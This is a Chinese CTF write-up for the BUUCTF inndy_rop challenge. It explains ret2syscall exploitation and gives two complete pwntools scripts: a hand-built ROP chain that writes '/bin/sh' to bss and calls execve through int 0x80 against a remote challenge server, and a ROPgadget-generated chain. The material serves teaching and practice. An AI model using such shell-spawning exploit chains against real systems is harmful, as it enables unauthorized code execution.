    # 题目

    ret2syscall的例题，链接：buuctf_inndy_rop (opens new window)

    先查看基础信息： 看情况可以进行栈溢出。，再拖入ida查看一下：

    发现文件没有动态链接库，看来是静态编译的。而由于整个过程中没有使用system函数，因此整个程序都不含有system函数，那么就不能调用system('/bin/sh')了吗？

    # 题目分析

    system函数（或execv）其实本质上都是调用了system call（系统调用）。为了操作系统的安全性，一部分函数不能被随意更改（就像我们通过栈溢出更改了部分程序的运行顺序，如果操作系统中也这样，就会导致系统崩溃等问题），这称为操作的原子性。因此，操作系统为程序提供了对系统更改的API，被称为syscall。维基百科上的解释：

    syscall的调用过程如上。

    而根据eax的不同，系统调用的函数也不同，具体对应如下：

    该内容可以使用 vim /usr/include/x86_64-linux-gnu/asm/unistd_32.h查看。

    因此，如果我们要执行execve指令，只需要先让rax=11，再调用syscall就可以了。（在32位程序中，syscall的汇编指令为：int 0x80）

    解决了调用system的问题，我们接下来需要寻找 /bin/sh的地址。我们在ida中搜索，发现没有，那应该怎么办呢？能否有办法将/bin/sh写入程序地址呢？

    使用pwndbg的vmmap指令，我们可以看到程序的虚拟地址空间：

    红色框代表权限，而能够写入的地址有栈，堆和另一个段，这个段叫做bss段，用以存放变量的地方，我们可以将内容写入其中。（为什么不写入堆栈中？因为堆栈的基地址是会变化的）

    写入/bin/sh的方法有很多种，比如read方法，或syscall，接下来使用read方法读入/bin/sh

    # exp

    from pwn import *
context(log_level='debug',arch="i386",os="linux")
pwnfile = "/image/rop"
## io = process(pwnfile)
io = remote('node4.buuoj.cn',27321)
elf = ELF(pwnfile)
rop = ROP(pwnfile)

padding = 0x10 

bin_sh_addr = 0x080EB564 + 4  #选取的写入/bin/sh的地址
int0x80_ret_addr = 0x0806F430  #syscall地址+ret方便返回

pop_eax_addr = 0x080b8016   #pop eax; ret
pop_ecx_ebx_addr = 0x0806ed01 ## : pop ecx ; pop ebx ; ret
pop_edx_addr = 0x0806ecda ## : pop edx ; ret

## 等同于函数：read(0,bin_sh_addr,8)
payload = flat(b'a'*padding , pop_eax_addr , 3 , pop_ecx_ebx_addr , bin_sh_addr , 0 , pop_edx_addr , 8 , int0x80_ret_addr)
## 等同于函数：execve("/bin/sh",0,0)
payload+= flat(pop_eax_addr , 11 , pop_ecx_ebx_addr , 0 , bin_sh_addr , pop_edx_addr , 0 , int0x80_ret_addr )

io.sendline(payload)
io.sendline(b'/bin/sh\x00')

io.interactive()

    除了以上解法，还可以通过ROPgadget 的ropchain来实现自动getshell：ROPgadget --binary rop --ropchain

    直接写入脚本：

    #!/usr/bin/env python3
## execve generated by ROPgadget
from pwn import *
from struct import pack
context(log_level='debug',arch="i386",os="linux")
pwnfile = "/image/rop"
io = process(pwnfile)
## io = remote('node4.buuoj.cn',27321)
elf = ELF(pwnfile)
rop = ROP(pwnfile)

padding = 0x10
p = b'a'*padding

p += pack('<I', 0x0806ecda) ## pop edx ; ret
p += pack('<I', 0x080ea060) ## @ .data
p += pack('<I', 0x080b8016) ## pop eax ; ret
p += b'/bin'
p += pack('<I', 0x0805466b) ## mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806ecda) ## pop edx ; ret
p += pack('<I', 0x080ea064) ## @ .data + 4
p += pack('<I', 0x080b8016) ## pop eax ; ret
p += b'//sh'
p += pack('<I', 0x0805466b) ## mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806ecda) ## pop edx ; ret
p += pack('<I', 0x080ea068) ## @ .data + 8
p += pack('<I', 0x080492d3) ## xor eax, eax ; ret
p += pack('<I', 0x0805466b) ## mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481c9) ## pop ebx ; ret
p += pack('<I', 0x080ea060) ## @ .data
p += pack('<I', 0x080de769) ## pop ecx ; ret
p += pack('<I', 0x080ea068) ## @ .data + 8
p += pack('<I', 0x0806ecda) ## pop edx ; ret
p += pack('<I', 0x080ea068) ## @ .data + 8
p += pack('<I', 0x080492d3) ## xor eax, eax ; ret
p += pack('<I', 0x0807a66f) ## inc eax ; ret
p += pack('<I', 0x0807a66f) ## inc eax ; ret
p += pack('<I', 0x0807a66f) ## inc eax ; ret
p += pack('<I', 0x0807a66f) ## inc eax ; ret
p += pack('<I', 0x0807a66f) ## inc eax ; ret
p += pack('<I', 0x0807a66f) ## inc eax ; ret
p += pack('<I', 0x0807a66f) ## inc eax ; ret
p += pack('<I', 0x0807a66f) ## inc eax ; ret
p += pack('<I', 0x0807a66f) ## inc eax ; ret
p += pack('<I', 0x0807a66f) ## inc eax ; ret
p += pack('<I', 0x0807a66f) ## inc eax ; ret
p += pack('<I', 0x0806c943) ## int 0x80

io.sendline(p)
io.interactive()
